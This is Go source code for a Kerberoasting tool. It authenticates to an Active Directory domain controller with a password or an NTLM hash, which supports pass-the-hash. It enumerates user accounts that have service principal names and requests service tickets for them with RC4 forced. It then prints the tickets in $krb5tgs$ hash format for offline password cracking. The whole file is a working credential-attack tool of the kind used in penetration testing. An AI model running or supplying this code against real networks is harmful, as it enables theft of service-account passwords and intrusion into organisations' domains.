package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/jedib0t/go-pretty/table"
	"github.com/mfdooom/gokrb5/crypto"
	"github.com/mfdooom/gokrb5/v8/client"
	"github.com/mfdooom/gokrb5/v8/config"
	"github.com/mfdooom/gokrb5/v8/iana/etypeID"
)

const libdeafult = `[libdefaults]
default_realm = %s
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 5
forwardable = yes
proxiable = true
default_tkt_enctypes = rc4-hmac
default_tgs_enctypes = rc4-hmac
noaddresses = true
udp_preference_limit=1

[realms]
%s = {
kdc = %s:88
default_domain = %s
	}`

type LDAPResult struct {
	spn         string
	accountName string
	memberOf    string
	pwdLastSet  int64
	lastLogon   int64
	delegation  int64
}

type FlagOptions struct {
	dcIp        string
	request     bool
	requestUser string
	hash        string
}

func options() *FlagOptions {
	dcIp := flag.String("dc-ip", "", "Need to define dc ip addreess")
	request := flag.Bool("request", false, "Requests TGS for users")
	requestUser := flag.String("request-user", "", "Requests TGS for the SPN associated to the user specified")
	hash := flag.String("hash", "", "NTLM Hash in the format LMHASH:NTHASH")
	flag.Parse()
	return &FlagOptions{dcIp: *dcIp, request: *request, requestUser: *requestUser, hash: *hash}

}

func printTable(ldapResults []LDAPResult) {

	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.AppendHeader(table.Row{"ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"})

	for i := range ldapResults {

		accountName := ldapResults[i].accountName
		spn := ldapResults[i].spn
		pwdLastSet := ldapResults[i].pwdLastSet
		lastLogon := ldapResults[i].lastLogon
		delegation := ldapResults[i].delegation
		memberOf := ldapResults[i].memberOf

		// Windows to Unix time stuff
		// http://sunshine2k.blogspot.com/2014/08/where-does-116444736000000000-come-from.html
		pwdLastSetUnix := ((pwdLastSet - 116444736000000000) * 100) / 1000000000
		pwdLastSetTime := time.Unix(pwdLastSetUnix, 0)
		pwdLastSetString := pwdLastSetTime.String()

		lastLogonString := ""
		if lastLogon == 0 {
			lastLogonString = "<never>"
		} else {

			lastLogonUnix := ((lastLogon - 116444736000000000) * 100) / 1000000000
			lastLogonTime := time.Unix(lastLogonUnix, 0)
			lastLogonString = lastLogonTime.String()
		}

		// Populate delegation information
		delegationInfo := ""
		if delegation&0x00080000 != 0 {
			delegationInfo = "unconstrained"
		} else if delegation&0x01000000 != 0 {
			delegationInfo = "constrained"
		}

		// Add LDAP Results to table
		t.AppendRows([]table.Row{{spn, accountName, memberOf, pwdLastSetString, lastLogonString, delegationInfo}})
	}

	t.Render()
}

func main() {

	opt := options()

	var LDAPResults []LDAPResult
	var nthash string
	var baseDN string

	l := log.New(os.Stderr, "GOKRB5 Client: ", log.Ldate|log.Ltime|log.Lshortfile)

	// Split up target data
	if flag.Arg(0) == "" {
		log.Fatalf("Need to supply target")
	}
	target := flag.Arg(0)

	userData := strings.Split(target, "/")
	if len(userData) <= 1 {
		log.Fatalf("Target format 'domain/username[:password]'")
	}
	domain := strings.ToUpper(userData[0])

	if !strings.Contains(userData[1], ":") && opt.hash == "" {
		log.Fatalf("Need to supply NTLM hash or password. Target format 'domain/username[:password]'")
	}

	username := userData[1]

	// If the Password is supplied convert it to NT hash
	if strings.Contains(userData[1], ":") {
		passData := strings.Split(userData[1], ":")
		if len(passData) <= 1 {
			log.Fatalf("Target format 'domain/username[:password]'")
		}
		password := passData[1]
		username = passData[0]
		et, err := crypto.GetEtype(23)
		if err != nil {
			log.Fatal(err)
		}
		k, err := et.StringToKey(password, "", "")
		if err != nil {
			log.Fatal(err)
		}
		nthash = hex.EncodeToString(k)
		// If the hash is supplied as arg use that
	} else if opt.hash != "" && !strings.Contains(userData[1], ":") {
		nthash = opt.hash
	}

	// Lookup the domain controller if ip isnt provided
	if opt.dcIp == "" {
		ips, err := net.LookupIP(domain)

		if err != nil {
			fmt.Fprintf(os.Stderr, "Could not get IPs: %v\n", err)
			os.Exit(1)
		}

		opt.dcIp = ips[0].String()
	}

	// Connect to the domain controller
	lconn, err := ldap.DialURL("ldap://" + opt.dcIp + ":389")
	if err != nil {
		log.Fatalf("cant connect to ldap server %d", err)
	}

	// Bind to DC with NT Hash
	err = lconn.NTLMBindWithHash(domain, username, nthash)
	if err != nil {
		log.Fatal(err)
	}

	domainSplit := strings.Split(domain, ".")
	for i, d := range domainSplit {
		if i == 0 {
			baseDN = baseDN + "dc=" + d
		} else {
			baseDN = baseDN + ",dc=" + d
		}
	}

	searchRequest := ldap.NewSearchRequest(baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))", []string{"dn", "cn", "lastLogon", "servicePrincipalName", "sAMAccountName", "pwdLastSet", "MemberOf", "userAccountControl"}, nil)
	sr, err := lconn.Search(searchRequest)
	if err != nil {
		log.Fatal(err)
	}

	// Get a list of usernames with SPN set
	for _, entry := range sr.Entries {

		spn := entry.GetAttributeValue("servicePrincipalName")
		name := entry.GetAttributeValue("sAMAccountName")
		memberOf := entry.GetAttributeValue("MemberOf")
		pwdLastSet, _ := strconv.ParseInt(entry.GetAttributeValue("pwdLastSet"), 10, 64)
		lastLogon, _ := strconv.ParseInt(entry.GetAttributeValue("lastLogon"), 10, 64)
		delegation, _ := strconv.ParseInt(entry.GetAttributeValue("userAccountControl"), 10, 64)

		// Add LDAP Results to LDAPResults array
		result := LDAPResult{}
		result.accountName = name
		result.spn = spn
		result.pwdLastSet = pwdLastSet
		result.lastLogon = lastLogon
		result.delegation = delegation
		result.memberOf = memberOf
		LDAPResults = append(LDAPResults, result)

	}

	if len(LDAPResults) > 0 {
		printTable(LDAPResults)
	}

	if opt.request {

		c, err := config.NewFromString(fmt.Sprintf(
			libdeafult, domain, domain, opt.dcIp, domain))
		if err != nil {
			l.Fatalf("Error Loading Config: %v\n", err)
		}

		cl := client.NewWithHash(username, domain, nthash, c, client.DisablePAFXFAST(true), client.AssumePreAuthentication(false))
		if err != nil {
			log.Fatal(err)
		}

		// send AS_REQ
		err = cl.Login()
		if err != nil {
			l.Fatalf("Erron on AS_REQ: %v\n", err)
		}

		for i := range LDAPResults {

			// send TGS_REQ
			tgsUsername := domain + "\\" + LDAPResults[i].accountName
			tgt, _, err := cl.GetServiceTicket(tgsUsername)

			if err != nil {
				l.Printf("Error getting service ticket: %v\n", err)
			} else if tgt.EncPart.EType == etypeID.RC4_HMAC {
				checksumHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[:16])))
				hex.Encode(checksumHex, tgt.EncPart.Cipher[:16])

				cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[16:])))
				hex.Encode(cipherHex, tgt.EncPart.Cipher[16:])
				fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)

			} else if tgt.EncPart.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
				checksumHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[len(tgt.EncPart.Cipher)-12:])))
				hex.Encode(checksumHex, tgt.EncPart.Cipher[len(tgt.EncPart.Cipher)-12:])

				cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[:len(tgt.EncPart.Cipher)-12])))
				hex.Encode(cipherHex, tgt.EncPart.Cipher[:len(tgt.EncPart.Cipher)-12])
				fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)

			} else if tgt.EncPart.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
				checksumHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[len(tgt.EncPart.Cipher)-12:])))
				hex.Encode(checksumHex, tgt.EncPart.Cipher[len(tgt.EncPart.Cipher)-12:])

				cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[:len(tgt.EncPart.Cipher)-12])))
				hex.Encode(cipherHex, tgt.EncPart.Cipher[:len(tgt.EncPart.Cipher)-12])
				fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)

			} else if tgt.EncPart.EType == etypeID.DES_CBC_MD5 {
				checksumHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[:16])))
				hex.Encode(checksumHex, tgt.EncPart.Cipher[:16])

				cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[16:])))
				hex.Encode(cipherHex, tgt.EncPart.Cipher[16:])
				fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)

			} else {
				l.Printf("Skipping %s, due to unknown e-type %d", tgt.SName.NameString[0], tgt.EncPart.EType)
			}

		}
	}

}
